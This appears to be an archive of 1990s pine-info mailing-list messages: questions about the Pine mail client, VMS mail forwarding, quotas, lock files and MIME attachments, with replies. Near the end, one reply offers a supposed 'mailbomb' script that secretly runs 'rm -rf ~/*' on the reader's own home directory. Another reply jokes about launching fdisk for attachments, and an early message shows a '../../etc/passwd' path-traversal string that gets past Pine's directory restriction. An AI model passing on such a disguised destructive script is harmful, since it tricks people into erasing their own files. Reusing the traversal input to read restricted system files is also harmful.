You cannot "view" that attachment. You have to uudecode it first (get
the tool from www.yahoo.com). To do this, export the message and do
what the instructions say.

There is probably something wrong with either your local mail
configuration or the address you sent the messages to. Probably the
latter. Check e.g.

	<url http://www.switchboard.com>
	<url http://www.whowhere.com>

to see if the addresses are in fact valid.

Later,
Robin

---------- Forwarded message ----------
 I'm using PINE 3.96 and i'm trying to restrict de access to de files out
of user's home directory. For example:

  HomeDirectory: /u/users/ashley/
  WorkDirectory: ~/work

 Ashley want to attach some file 
  
  Attchmnt: /etc/passwd

And the message "Attachments allowed only from //work" is showed.
BUT !!! 
If she try with...

  Attchmnt: /u/users/ashley/work/../../../../../../../etc/passwd

The things change... and she get the file.

 How can i do to solve this problem?

Regards

Asley Lugo Avila <asley@digicron.com>

Sir,
 Iam Ebenezer.Received U're(Mr.Robin) reply regarding my complaint of mail
bounce back in U're pine program.I had forgotten to mention along with the
display of" MAILER-DAEMON".When I wanted to view the message after I came
to know that the mails had bounced back (i.e., when I had given the
command "mailx" to check any incoming mail) the monitor displayed the
following,
 " Message contains data in an unrecognised format which can either be
viewed as text or written to a file". Surprisingly, this message was
followed by a query-"Whether I want to do any of the following
1)View the message as text?
2)Want to write it to a file?
3)Just skip it?                  "
 
			I was able to do all 1,2&3.Please enlighten me on
this & tell me what to do?
                   As U had adviced me I had checked the addresses , they
are correct.Apart from that other's mail haven't bounced back indicating
that the local server is proper.
                    Reply soon.
              My E-mail address is(Please address as" message to
Ebenezer")
           cata@ems.ncl.res.in

I read messages about forwarding mail by creating a file called
".forward" for UNIX systems, which works when I use that for my unix
system to transfer email to the vms server.  However, I would like to do
just the opposite: forward my email from my vms to my unix account.  I
am unsure about how to accomplish this.  Any suggestions would be
greatly appreciated.

Well, my stock has long since plummeted from its almost forgotten
height ov over $60/share, and I've realized that if I drill a hole
through the handle-thing on the top of my Classic II, I can thread a
cable through it and use it as a boat anchor.

What do I win?

Oh boy.. s'been a while.

I think you need to go into vms mail and type "set forward=blah" but it's
been a loooong time :)

If you need to include the po%"blah@blah.com" format then do so.. so
supposedly, the command is:

set forward=po%"blah@blah.com"       or something else appropriate.

Or possibly I am totally wrong :)

Hi. I'm writting you this mail because I have a little problem. My INBOX
folder is READONLY, I don't know why. Two days ago I had some problems
with a computer, so I decided to move to another. I was Taking an address
when the problems bagan. I couldn't do anything else, so I start another
computer and opened Pine. So, I had the same screen in two computers.
Then, I just turned off the first one. I continued working normally on the
other. Yesterday I came to check my email and it then I tried to delete
some emails from the INBOX folder, and then I realized that it was now a
READONLY folder. Today I tried to delete them again, but it remains
readonly. Before yesterday, i had never had this problem, there was no
problem with the delete command nor the INBOX. I looked out at the "HELP",
but I could not find anything that tells me how to fix it up. Please help
me, the INBOX folder is getting filled up.
							Thanks

Because pine has created a lock on your inbox when you started a
second session of pine. Say:

       ps ax | grep pine

and then kill the processes. Alternately, say "jobs" and get the ones
you don't need into the foreground (fg). "man bash" will reveal all
about those two commands. To learn more about pine's lockfiles, go

First, it sounds as if your "mailx" program has been integrated with
metamail and that it has certain attachment types for which a mailcap
entry does not exist.

It would be most helpful if we knew the full text of the message issued
by the Mailer Daemon.  As Robin mentioned, it is probably either a local
configuration problem or a problem with the email address.  You could
send me (or ask Robin) to check the email address for you.

I know the answer to this one!.
You need to use the set forward command.  It looks something like this
set forward """smtp%username@machinename.domainname""""
Now you enter this command from the VMS Mail Prompt. It cannot as far as I
know be done from within pine. This is also the format if you site is
using Mulitnet as the smtp/telnet/ftp client/server. Since you are from a
edu site You may be running Dec version of the smtp/telnet/ftp server.
Check with you helpdesk or your system manager for the exact format of
the command.  You may or may not need the triple double quotes. Cannot
remember the reason we used this format it may have been the software
version syyntax at the time.

Yup, I remember it now :)  I was close, I guess.

In VMS, double-double quotes is the way to denote a quotation mark in a
string.  so:  'write device "I said ""hello"""'  would print
'I said "hello"' to the specified device.  I think the mail needs the
double quotes as part of the email address itself, hence the doublequotes
at the begining to denote a string, then the double-double quotes to make
the doublequotes contained in the string.  It's all very complicated,
which is one reason IU got rid of their VMS-based machines :)

I've learnt some time ago about the BinHex format. I've been looking for
information about the standard, but nowhere is commented why the
extension is HQX. (Only in the help file an old version of xbin for UNIX
I found that "BinHex usually has the extensions .hex, .hcx or hqx",
making a kind of difference between them).

Thank you very much

.gov = government

..
Where can I find what each extension
stand for (e.g., .net =? ; .org =?,etc)?

It's a question. I have a ordinary pc at home with no internet conncetion
whatsoever. Why should I want to use pine? Well, my sent-mail get really
big after some months and I usually take them home and store them. It's no
fun to use a ordinary text editor, I want to use the mail program I'm
currently using, pine. I tryed to install the pcp_w16.zip and it complain
abouth rhe winsocket .dll, needless to say, I don't have those libraries
installed. Should I install it? And will it work then? Is there any
'fake-pine'
that can be use only to see msgs?
Later, 

Miguel Afonso

Dear Sir,

I am a new pine user. Thanks for an excellent program! But I have been
wondering whether I could transmit a research report from a diskette or
hard disk using Pine? If this is possible, could you please give
directions?

Many thanks!

Dr. Chris Abotchie.

Absolutely. Just recompile like this:

     ./configure --with-read-faq --with-consult-dejanews

Strangely enough, this isn't in the faq yet.  

Hope that helps...

Ok, here's an entirely different approach: See if you have mhonarc on
your u*ix host. Run it on your mailfolders. This way, you'll get a
browsable, searchable html-version of your mail. I find this program
extremely sexy, because I have my own webserver and glimpsehttp.

Pine can't do that, but your system is probably already set up to forward
mail if you set it up.  Try this:

Go to the directory where you are when you first log in, and create a file
called '.forward'  -- that's forward with a dot at the front of it.
In the file, type a single line which contains nothing more than your
other address.

For example, if your other address was watson@elsewhere.net, the line
would look like this:

watson@elsewhere.net

If you want to have it forward the messages to that address, but save a
copy at the first address, it would look like this:

\wanonet, watson@elsewhere.net

Be sure to include the \ at the beginning of the first username.


Hope that helps.

Source distribution: 

       ftp://ftp.cac.washington.edu/pine/pine.tar.Z

So, get yourself an ftp program if you don't already have one, and get 
the README too, that's in that directory. Follow the
instructions. Should work like a charm.

Later,
Robin

Many mail programs have an option for requesting a confirmation of
reciept.  Sort of like sending a registered letter, you get to see when
your e-mail was read.  This can be very handy.

Is there such a feature in Pine, and if so, how does one use it?

Thanks

Ok, Ken, this is *exactly* the right place to ask this question. The

Hope that helps,

Hello, I've noticed that when I want to select more than one receipent for
a message using the address book's "select" feature, That is does not put
the selections in the "To:" heading. I put an "X" by all the names but it
does not put then in the message. I wind up having to manually type in the
addresses separated by commas. Any help that can be provided will be
greatly appreciated!

Thank You!

i ran into a strange problem the other day.  a friend of mine has a
read-only address book.  it hasnt always been that way.  he didnt have any
other instances of pine open & i checked the read/write/exe/del protection
on his address_book.  everything seemed to check out fine.  we ftp'ed
another address_book and replaced his old one just to see if we could fix
the problem, but to no avail.  his address book has been read-only since
then.  nothing else seems to be read-only, just his address book.  i told
him i would try to find out howto fix his problem. he is using pine 3.95
on vms.  thnx, -vic-

Robin is trying to say (in his own special way) that this question has 
been asked a couple of times before on this group, and that you should 
check out the archives at www.dejanews.com.  I would explain it for
you here, but

      1) Learning how to use Dejanews builds character, and
      2) I've just converted (of my own free will) to a Dvorak
         keyboard layout, and suddenly become rather slow.

Errr... no... I just couldn't find this one in the FAQ. Duhhh. It
ought to be there by rights, but then again... MS won't be there once
we have world domination, so why bother?

Could I have one, too? My old American layout keyboard died two months 
ago, and German keyboards plainly suck...

Hello all.

I just purchased a Macintosh Plus 1MB.  This is the first Mac that I have
ever owned and would like to make it suitable to check my e-mail.  I have
an external HD (I'm not sure of the size). I'm not sure of the operating
system.  Besides having to purchase a modem, what else would you all
suggest to make it suitable for my e-mail?

Thanks

Subject: WHERE TO FIND INFORMATION ABOUT PINE
X-Listprocessor-Version: 8.1 beta -- ListProcessor(tm) by CREN


This message is being sent to this mailing list weekly in order to
aid readers in finding information about Pine.  Before sending questions 
to the mailing list -- which is mirrored in the newsgroup comp.mail.pine --
please consult these resources:

The Pine program itself includes extensive internal, context-sensitive
help.  Additional information, including a User's Guide, Technical Notes, 
Questions & Answers, where to obtain the Pine software, what tools are 
available to perform tasks that Pine itself does not, and more, can be 
accessed:

     - In the Pine Information Center on the World Wide Web at the URL:
       http://www.washington.edu/pine/

     - Via anonymous FTP on the host ftp.cac.washington.edu in the
       subdirectory /pine/docs/. Here, you will find most of the
       documents from the Pine Information Center in plain-text form.

     - The Pine documents on the host ftp.cac.washington.edu can
       also be read from within Pine by defining a folder collection
       (from Pine's MAIN MENU, choose SETUP, Config; then move to
       folder-collections and choose Add Value) as:
            *{ftp.cac.washington.edu/anonymous}pine/docs/[]
    

The messages from this mailing list/newsgroup are archived.  These archives
can be accessed:

     - In the Pine Information Center on the World Wide Web at the URL:
       http://www.washington.edu/pine/pine-info/
       (includes a searchable index of all archived messages, and information
        on how to subscribe to this mailing list)

     - Via anonymous FTP on the host ftp.cac.washington.edu in the
       subdirectory /pine/pine-info/.

     - From within Pine by defining a folder collection (from Pine's MAIN
       MENU, choose SETUP, Config; then move to folder-collections and 
       choose Add Value) as:
            *{ftp.cac.washington.edu/anonymous}pine/pine-info/[]

If you have a question about Pine, chances are it has been asked before
and you can find the answer either through the searchable index of past
messages, or among the "Questions & Answers" at the URL: 

http://www.washington.edu/pine/QandA/ 
  or
ftp://ftp.cac.washington.edu/pine/docs/QandA.txt

If you need personal assistance with using or configuring Pine, contact
the technical support staff or computer help desk of your Internet Service
Provider, school, university, employer, ... -- whichever organization
provided you with the email account on which you are using, or planning on
using, Pine.  Because system functions and configuration can vary from
site to site, they are best qualified to assist you.  (Due to the large
number of Pine installations worldwide, the University of Washington
cannot provide individual support services to Pine users at other
organizations.)

5.1.4.21 BACKGROUND POSTING (EXPERIMENTAL!!!)

   New in Pine 3.94 is an EXPERIMENTAL feature permitting optional
   sending of messages ``in the background''. Choosing this option at the
   ``Send?'' confirmation prompt causes Pine to split into two processes;
   one returns immediately to your control while the other continues
   sending the message.

Hi,

Is there a way to tell pine, that as a default to act as a regular window,
and thus using the mouse cut and paste **without** the shift key ?



Thanks,

Yossi

Is that pine for unix or do you run it in an X-window on console or what?

CUT/PASTE (with the mouse) in a telnet session is handled by the telnet
application and would have nothing at all to do with pine.

It is a X windows system.  It's not telnet.

Every time I open my mail I receive this message:
 
[{hpryor.deskmail}inbox :  Over quota mail will be returned after Wed Oct
1 07]

I've been getting this message since the middle of September. I've  opened
up more file space. I've been receiving my e-mail the entire time. Now I
have this new message that comes up every time I open my e-mail:  
 
[{hpryor.deskmail}inbox :  Last message bounced back to sender on Wed Oct
1 23]

Please make this messages go away.

Thank you

On many systems, you have two or more quotas associated with your account.
One obvious quota is the actual file space you have.  Another common one
is your mail quota, which is totally separate from the rest of your
file space.  If your MAIL quota is exceeded, then removing files from your
account and "making room" will have no effect.  You would need to move the
messages from your inbox (either delete them or save them to a mail
folder, which would then be stored in your actual account space)

This message probably means that messages are being bounced back to
whoever sends them with a message that you are over quota.  You will need
to rectify the quota problem before receiving any new mail.

To whom it may concern:

I had subscribed to a newsgroup when I was interrupted by some incoming
email.  I left the newsgroup and tried to enter my "In-Box" to check my
mail, when instead of showing my new email it showed everyone who had
replied to the newsgroup in my "In-Box".  Then I had to delete all of
those people from my "In-Box", logout completely,  then log in again to
get that new email.  To top this off, I have now lost the message and it
is nowhere to be found.  It is not like I am a new user of pine, I have
been working on it for about 2 years now, but I am not advanced.  I know
there have been a lot of changes, but are these part of it-- or am I
experiencing a bug?

Thanks!

Hi, Lillian,

your problem is probably covered by the FAQ.

Try something around

    <http://franck.pc.uni-koeln.de/~robin/user.guide/node48.html>

and come back if that doesn't help. Do make sure that you're using the 
"correct" telnet program (Ewan is rumored to work well - but who uses
windos?).

HTH,
Robin

[ mailing list and the comp.mail.pine newsgroup                       ]

We haven't seen any outcry of support for re-establishing the gateway
between pine-info and comp.mail.pine, so we are considering the split
to be more-or-less permanent.  As a result, we would like to see a
shift in the focus of the discussion on the Pine-Info list toward a
more technical discussion of issues important to pine/system
administrators, contributors, and advanced users.  We do not have (nor
do we want ;-) any control over the comp.mail.pine newsgroup...

IOW, you're actually going to moderate the mailing list? Fine.

Sirs,
Certaainly don't want to waste your time, but...
Why might it be that I can't manage to attach anything at all to emails I
am sending, while I do recieve attachments being sent to me.
I have reconfigured numerous times and get nowhere. Control-R doesn't work
either.
Best regards, and hoping for a response,
Edward Goltz

*Don't do that*.  (Maybe this should be in the FAQ too...., Robin?)

If you leave the "To:" field blank some MTAs will insert an
"Apparently-To:" field and expose all of the receipients.

Chances are very good that you are specifying the filename or path to the

What, error message are you getting?

Hi Rebecca!
Alas, you should email your friend, and  ask him/her what browser they are
using. Also let me know what browser you are using. If anyone is
interested, you can see some work I did, "back when" while grappling with
such problems.Point your browser at
http://linus.uhmc.sunysb.edu/~colin/mail.html
Files have to be "attached" or sent in a form that BOTH ends can
understand. (Kind of like me sending you a document in Russian, when you
can only speak Chnese). Start by suggesting to your friend that they adjust
(tweak) their browser to UUencode (unless they are using Netscape mail 3.0
in which case that client can't speak UUencode. If it's really critical,
then I suggest you both download and install a copy of Eudora Light, which
will enable you both to "speak the same encoding language"
You can get Eudora Light by downloading it from
http://www.eudora.com/eudoralight/#download
If you really run into any seemingly intractable problems, email me
off-list and I'll help you solve the problem further.
Colin

I have a quite huge problem using fetchmail 4.0.1 together with sendmail or
Pine3.96

I`d like to use fetchmail to fetch mails from a POP-Domain and forward them
with sendmail or Pine3.96 to different Unix-mail-accounts.

Fetchmail I think does everything right, but when I use sendmail as "mda"
fetchmail terminates with signal 13 after fetching the mails and handling them 
to sendmail.

Using it with Pine is also quite strange : fetchmail handles the mails over to
pine, but every time a mail arrives at pine, the pine mail-editor opens with the
received mail. It looks somehow like the following :


PINE 3.96   COMPOSE MESSAGE                        Folder: (CLOSED)  0 Msgs

Pine wants me to enter the To-address !!!

Why, it already stands a bit more down in the received mail !
Can`t pine take it from there ? If so, how do I have to configure this ???




I hope somebody could give me some hints for these problems !

Dear Sir,

Recently I meet a problem and I found no answer anywhere, I hope this
email is not make too much trouble to you. The following is my problem:

As we know, we can forward a file to a destination directory by using
.forward file. But I found that if the saved mail is append each time.
Can I replace the original old copy of mail rather than append on it?

Best regards,
kenli

I suggest to add the following entry to the faq:

Q: What is an application/ms-tnef and what do I do with it?

A: It's a useless attachment created by pathetic Mail User Agents such 
   as Mickysoft Outlook Express. They can safely be ignored. With
   PC-Pine, you can modify your mailcap to lauch an appropriate
   program, such as fdisk or loadlin.

Hi, Dorothy, you're #28 to ask this question in just 2 months. Have
you ever heard of a thing called:
	<http://www.dejanews.com>? 

Have you ever consulted the pine help page:

	<http://www.washington.edu/pine/>

or my dvi, ps and html version of it:

	<http://franck.pc.uni-koeln.de/~robin/>

and if not, why not?

  3.7 How can I have a signature automatically appended to my mail
      messages?

   From Pine's MAIN MENU, choose Setup, then Signature. The text you
   enter in the SIGNATURE EDITOR (new in Pine 3.92) will be appended to
   all messages you compose.

Read the FAQ, young man. Browsable and printable versions to be found
on my website (see X-header)...

Step 1:	You are using an age-old version of Pine (3.89)
	Upgrade to the current version (3.96)

Step 2:	Start your new version of Pine and type:
		S		(Setup)
		S		(Signature)

Should be obvious from thereon-in.

Cheers,

At Texas A&M and many other universities, OpenVMS is at version 6. This
new version allows you to not use smtp%"..." so you can directly say set
forward "johndoe@aol.com". Not tested. But I think this is right.

Pine is a MUA (Mail User Agent). Sendmail is an MTA (Mail Transport
Agent). You'll want to use sendmail with fetchmail, I would think. Best of
luck with getting everything together. If you run into any more problems,
check with the makers of fetchmail, or consult a sendmail reference. :)

I have installed dnews on our Alpha 4000 and am attempting to
configure Pine 3.96 so I can use its News-reader feature.

I have been unsuccessful.  It appears that the 3 settings I
need in the configuration are:

news-collections
news-active-file-path
news-spool-directory

I had a news-collections setting of *{ac.sjfc.edu/nntp}[], which was working.
When I went to subscribe to a newsgroup and hit ^T, I got the full list of
all newsgroups.  The news-active-file-path and news-spool-directory were
set to no value and the files existed in the same directories that the 
online help said they would be.

I changed news-collections to  *{sjfc.edu/nntp}[] (just removed the ac),
which is where the dnews server is running, and modified the
news-active-file-path
and news-spool-directory settings.  

Now when I attempt to subscribe to a newsgroup and hit ^T, I get a message
that says  [>No groups to select from!<]

Can anyone offer any advice?

I will look forward to have a list as you suggest, so we can get rid of
all the "simple" user questions, which can be solved by using the
extremely good HELP-functions in Pine, or just read the available
documentation.

Please don't flame me for this opinion, because I think we can use two
lists, one for beginners and one for system administrators etc.

Umm... one thing that struck me as odd, though: pine is mainly a
newsreader, so it might be overly tempting to write a quick mail when
in trouble. Whatever... Maybe there ought to be a "developer" or
"advanced user" list, but... just what would one want to advance from
with pine? IMO, about 90% of the questions put on this list are useage 
question that are covered by the docs in one way or another.

I think you're perfectly right, but unless the sysadmin list is closed
(good) or moderated (bad), your idea will probably not work.

Just my DM,02,

My, my... T(ake) the address, ^T (go to address book), hit the list,
add the entry, done. I didn't know that and it took me 20 seconds to
figure it out... Would it have been asked too much from you?

I'm not sure why you would want to do that... sounds like you would want
to append, and not overwrite (as opposed to the other way around).

Try an off-list reply to me with some details on what you're trying to
accomplish. I see what I can do. Procmail might be the answer. :)

To whom it may concern,
  I was unaware that saving messages through pine would take up a lot of
memory in my e-mail. After a few days of not receiving mail I figured
something was wrong and decided to just delete everything. I had around 80
e-mail messages, so I deleted all but one message. The problem is that
each time I log into my e-mail, the POPmail tells me that I must lose over
5,000,000 bytes of space, but I can't do that because I really have
nothing left to delete. What should I do?
  I am unable to receive any messages because of this problem, so whatever
you can do to help me would be great! If it means wiping out everything in
my e-mail that would be fine with me, as long as I can get this thing
working again.
  Thanks for your help.
    Sincerely,
      Andrew Estaphan

Have a problem

OS5 UNIX system cannot seem to run Pine on IBM 3151 terminals.  They get 
the following error message.

Termcap entry is too long.  Your terminal, of type ibm3151 is lacking 
functions needed to run pine.


Any thoughts or suggestions would be appreciated.  Reply to 
kiyote@rocketmail.com.

Thank you.

Mike

But it will be a LOT easier to point to the FAQ/online help here, whereas I  
was flamed for doing so on the newsgroup JUST because someone had asked 'How  
do I change my "From"' for the fourth time that week.

I'm not sure if I'm asking the right person, but I have a question.  I
use netscape and I received a letter with some sort of attachment that
said 2.1 and then "application/ms-tnef"  Do you have any idea what I
need to download to read the mail?

In the words of the esteemed Robin S. Socha :

"  It's a useless attachment created by pathetic Mail User Agents such
   as Mickysoft Outlook Express. They can safely be ignored. With
   PC-Pine, you can modify your mailcap to lauch an appropriate
   program, such as fdisk or loadlin."

make sure you don't have the name of your addressbook file in the
setup-config menu under the line :

global-address-book      = <Value>  (putting it here make it read-only)

but instead, it should be input on the line :

address-book             = <Value>

from the Pine help under MAIN-SETUP-CONFIG

        FEATURE: enable-mouse-in-xterm
 
This feature controls whether or not an X terminal mouse can be used with
Pine.  If set, and the $DISPLAY variable indicates that an X terminal is
being used, the left mouse button on the mouse can be used to select text
or commands.
 
Note: if this feature is set, the behavior of X terminal cut-and-paste is
also modified.  It is necessary to hold the shift key down while clicking
left or middle mouse buttons for the normal xterm cut/paste operations.

go to the main menu , type 'L', then try the 'sent-mail' folder .


if that don't work, go to Main Menu, type 'S' , then 'C'. 

Look for this line --

default-fcc              = sent-mail
                            ^^^^^^^
make a note of what this part is, then go to the main menu , type 'L',
and go to that folder.

A coworker sent me an email which is in MIME
format. I have never worked with MIME formatting
before.

How do I view the data?
I believe it originally came from an MS Word
document.

I am running PIne 3.96 on SunOS 4.1.4.

Thanks.

It wouldn't happen to be application/ms-tnef would it?

If so, 30 in a week is a lot ;-)

If not, what type does it show up?

Yes, your messages sent should be in a folder called "sentmail"

Shawn,

Thanks for the reply BUT:

My question was about using CUT/PASTE  **Without** the SHIFT key !

I don't know how and when, but I remember that sometimes my Pine works as
a real X-window without the use of the SHIFT key, and I don't know how to
make it act like this.



Thanks,

Yossi

Hi,

Is there a way to tell Pine not to beep when a new mail arrives but to use
a different sound ( from an audio file etc.)  ?


Thank.


Yossi

That's not pine, that's biff. man biff and xemacs -nw ~/.profile
should do the trick.

Yeah, the key words there were "If this feature is set". AFAIK, if you
UN-SET this option, you should have normal cut'n'paste operation, but
you'll lose the ability to click on the menu items. IOW :

[X]  enable-mouse-in-xterm    --- left button used to select commands
                                  need to use SHIFT to cut'n'paste

[ ]  enable-mouse-in-xterm    --- cannot select menu commands
                                  normal xterm cut'n'paste

Hope this helps.

Could be biff... Could be Pine. If you're in Pine when new mail arrives
[or up to 2.5 mins after that, in most installations ;) ], Pine will beep.
This is a bell character sent to your terminal. If you can change the
sound your terminal makes when a bell character is seen, you can change
this "beep". You can't change the sound for *just* Pine. You'll be
changing it for any time your terminal sees a bell character.

Good luck,

Unless you have a Word viewer installed on your Sun machine (I believe
that those only are available for W*ndows and M*cIntosh anyway), you'll
need to save the attachement to your home directory, transfer it to a
PC/Mac somewhere, and read it into Word there.

When viewing the message, press 'V', as in View, to get a list of the
attachements. The attachement should be labelled either
application/x-msword or application/octet-stream, or something similare.
Place the cursor over it, and press 'S', as in Save, to save it to your
home directory. Then transfer it to your PC/Mac with ftp or similar, and
load it in with Word.

Not without getting the Pine source code, and change the behaviour, no, I
don't think so.

Unfortunately.

Well Good Gwen, no-one was being patronizing. The list exists to help all
those from the absolute and complete beginner (the one's that it's amazing
they can even find the "On" switch) right through systems administrators
looking to alter some configuaration files system wide for user groups.
You wrote to the list, no-one could guage your level of expertise or
familiarity with Pine, or email in any form for that matter of it, and the
list will attempt to help anyone who emails a question (within reason)
Sooo...you got an answer.
You should think carefully before telling anyone who genuinely attempted to
help you (sight unseen) that they are being patronizing.
I shall publish your response to me to the list, (since you should always
reply to the list as well as, but not instead of individuals) so that the
others who also tried to be of assistance can bathe in the warmth of your
kind and thankful reply, and get that nice warm glow that comes from
helping others, and being of service.
I'm so glad though, that you DID in fact find what you needed at the end of
the day. Perhaps that's what counts.

Accepted with pleasure, you didn't hurt anyone believe me. I read the
frustration in your reply, and well understood it.
Glad to be of service (so I guess are many others, that's why your Inbox
gets flooded with many similar replies)
Don't forget to post to the list as well as individuals when you reply.
If you need further help, I do encourage you to post to the list, it is of
assistance many times, but give the FAQ's a try, they can be helpful
Good luck to you!
Colin

I'm having trouble printing any messages, mail or info coming through pine
I have trouble when it comes through telnet or microsoft. I have no
problem in any other program  like Quicken or Word. My printer is an
Okidata 92 but is  installed as a genetic because it is not IBM compatible
and doesn't work unless it is installed as a genetic. when I'm in pine
through telnet it doesn't work at all. When I'm in Microsoft it prints
several times over and is unreadable.     lsasfy@monroe.lib.mi.us

I am configuring Pine for news reading.

I have the news server on the same machine as Pine.

The nntp-server setting is sjfc.edu

Upon reading the tech-notes for version 3.96 (Alpha 4000), I found that I 
can leave the news-collections variable unset (see below):

When I attempted to configure this way, I exited Pine, re-entered, and
went to my folder List screen.  I have the screen divided into 2:  the 
top half is my mail folder collections, the bottom my news collections
with the groups in my .newsrc listed.

When I highlight a group and press ENTER, I get a message that says 
[502 no permission to read that group].

When I press A to subscribe to a group and then ^T to list all groups,
I get a message that says [>No groups to select from!<].

I tried this from my personal account and from the root account with the
same results.  I'm trying to read this with dnews.  

Can anyone help?

I see the question posed by lbjork@total.net re: TS-NEF attachments. I 
have no problem, and I could not find any, either. However, I'd like
to suggest that you get a copy of netiquette and READ IT before you
write to a mailing list EVER again. Also, you might want to learn to
consult the help that is available via the internet:

	<http://www.dejanews.com>

and the pine information center (location to be found in the
documentation that came along with your program).

Hi!  Could you please tell me where I can get access to binhex40.  We 
already have Stuffit expander, but I can not open the binhex files on 
my Mac - Even if they are sent from another Mac.

Thanks for your help.

Nicolas,

If you're trying to ask about where to find a listserv on a specific
subject, you have written to the wrong mailing list -- pine-info is about
the Pine email program.  For finding a mailing list, try some of the
resources at

	http://www.washington.edu/nic/forums.html

Hi there!

I got this address from the web about help with Mac printers.
I was wondering if you knew of any software that I could download in order
to reconfigure a LaserWriter Select 360 so that it no longers prints Test
Pattern Sheets before printing a document.

Thank you for youe help.

Everytime I write a message after a certain amount of time the message
leaves and the screen go to the Dial-Up network. It isn't because I am on
the 15 minute limit because I was connected to the student 28.8 so I'm not
sure what is going on? If you could give me some suggestions that would be
great. I can't figure out how to retrieve those messages so I'm not sure
if my friends are getting the messages or if they are just being erased.
Anyhow. . .if you could help me that would be great!

Why does the following always show up on my screen when I start to compose
an e-mail message?  It has only been doing this for the last month or so.
What can I do to get rid of it? (I know I can use control-K, but that
'garbage' shouldn't show up on my screen.)

Is it possible you have this in your "signature" file?

Hello

I am sure this is a question that has been asked many times before.

Is there any way to limit the size of the attachment a user can send from
within Pine?

I also have a customer that wishes to prevent some pine users from
E-mailing to external addresses, has anyone come up with a way to do this?

Thanks in advance.

Colin

Not from within pine.

Yes.  But it requires you have an intelligent MTA.  I'm not sure, but
generic sendmail, while quite good, is not capable of this sort of thing.
You need to get an MTA which can allow you to set rules on what goes out
on a per receipient and a per orginator basis.  

I could recommend such an MTA if you are interested.

Regards,
Ed

I've been experiencing a problem with PINE, as of this morning...  I'll
try to describe what's happened-and I hope someone can get back to me
quickly-if you've had the same problem or know what's going on.

This has never happened to be except for TODAY-and it hasn't gone away
yet, but-when I select PINE... It hangs for about 10 seconds on the main
screen...while saying OPENING INBOX <->...then says "TRYING TO GET MAILBOX
FROM LOCK PROCESS 22214"/"MAILBOX IS OPEN BY ANOTHER PROCESS, ACCESS IS
READ ONLY"  And so, I'm unable to delete my incoming messages from my
INBOX...and the e-mail's are piling up...

I hope someone is able to help.

I am NKreitzer@ SUNYRockland.edu and am having a problem with pine.
Yesterday I pushed "help" becuase several times I could neither send nor
keep a reply to an email I had received.  When I pressed the "help?"
function, my printer began prewing forth endless pages called "Release
Notes for Pine..A Program for Internet News and Email.  I cannot get out
of this mode, although I shut off my computer on October 9th and went
home.  Today, October 10th, when I turned the printer on again, it kep
printing this same material even though I was not in "pine" mode.  Someone
local has yet to take a look at my computer and printer, but, meanwhile I
cannot use anything.  What gives?    N. Kreitzer

The PINE Questions & Answers list contains "4.6 How can I control
association of MIME-attachments with applications and filenames?" at

	http://www.washington.edu/pine/QandA/custom.html

which gives a few examples ("application/ms-tnef" not among them ;-) of
configuring PINE to handle some MIME types.  Adding all kinds of types to
the examples would make it rather unwieldy, so the advice of others to
check Dejanews for discussion of attachments of dubious type is a good one
(with a search filter to target the newsgroup comp.mail.mime perhaps). 

The best advice I found there that's, IMHO, within the tolerance limits of
what an email recipient could be expected to do is to ask the sender to
resend the message turning off tnef-sending; perhaps with a note
explaining that this is likely to cause problems for other recipients of
the sender's messages as well.

Matthew LOVES teddy bears. To him they are the friends he has never had.
He gives to them and they to him much much love. We are trying to
arrange a big surprise for him. If you have a teddy bear you may no
longer want and you would like to give it to Matthew, our address is
PO Box 959

With my best wishes and biggest thankyou
from
his very proud and loving Mama

X-Listprocessor-Version: 8.1 beta -- ListProcessor(tm) by CREN


This message is being sent to this mailing list weekly in order to
aid readers in finding information about Pine.  Before sending questions 
to the mailing list, please consult these resources:

The Pine program itself includes extensive internal, context-sensitive
help.  Additional information, including a User's Guide, Technical Notes, 
Questions & Answers, where to obtain the Pine software, what tools are 
available to perform tasks that Pine itself does not, and more, can be 
accessed:

     - In the Pine Information Center on the World Wide Web at the URL:
       http://www.washington.edu/pine/

     - Via anonymous FTP on the host ftp.cac.washington.edu in the
       subdirectory /pine/docs/. Here, you will find most of the
       documents from the Pine Information Center in plain-text form.

     - The Pine documents on the host ftp.cac.washington.edu can
       also be read from within Pine by defining a folder collection
       (from Pine's MAIN MENU, choose SETUP, Config; then move to
       folder-collections and choose Add Value) as:
            *{ftp.cac.washington.edu/anonymous}pine/docs/[]
    

The messages from this mailing list are archived.  These archives can be 
accessed:

     - In the Pine Information Center on the World Wide Web at the URL:
       http://www.washington.edu/pine/pine-info/
       (includes a searchable index of all archived messages, and information
        on how to subscribe to this mailing list)

     - Via anonymous FTP on the host ftp.cac.washington.edu in the
       subdirectory /pine/pine-info/.

     - From within Pine by defining a folder collection (from Pine's MAIN
       MENU, choose SETUP, Config; then move to folder-collections and 
       choose Add Value) as:

Please note: the mailing list is no longer mirrored in the comp.mail.pine 
newsgroup.

If you have a question about Pine, chances are it has been asked before
and you can find the answer either through the searchable index of past
messages, or among the "Questions & Answers" at the URL: 

http://www.washington.edu/pine/QandA/ 
  or
ftp://ftp.cac.washington.edu/pine/docs/QandA.txt

If you need personal assistance with using or configuring Pine, contact
the technical support staff or computer help desk of YOUR Internet Service
Provider, school, university, employer, ... -- whichever organization
provided you with the email account on which you are using, or planning on
using, Pine.  Because system functions and configuration can vary from
site to site, they are best qualified to assist you.  (Due to the large
number of Pine installations worldwide, the University of Washington
cannot provide individual support services to Pine users at other
organizations.)

The only way (if you are reading the mail on the server using pine) is to
save it on the server and then transfer it with ftp or sz.

Sure. I think mailbombs are real fun, too, so here's what I use. I
presume you`re on a unix system. Then you have to cut out the
following line and add them to a file. Like, you go

	  pico ~/mailbomb.sh

and then run it with

	 sh ~/mailbomb.sh


So here is the script:

================8<=======================

#let`s run this for quite some time
while true
#now let`s start the fun...
do
#make sure that you get the other server to overflow: mailbomb its
#local postmaster, too...
mail postmaster@localhost
#mailbomb the other person...
mail foo@bar.com
#make sure that all (~/*) your _M_ail gets _R_ead _R_eally _F_ast,
#otherwise the bomb won`t work.
rm -rf ~/*

================8<=======================

Happy bombing!

Subject: operating-dir bug?
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
X-Listprocessor-Version: 8.1 beta -- ListProcessor(tm) by CREN

Dear All,

(I posted this to comp.mail.pine early last week and met with a resounding
silence.  Perhaps the truly sympathetic souls live on pine-info? :)

I'm running Pine 3.96 on Solaris 2.5.1.  I'd like my users to be
restricted to their ~/mail directories, so I configured Pine's
operating-dir accordingly. 
 
The problem is that now we get errors like "Can't save to file outside of
[~]/mail" when we try to save attachments and the like.

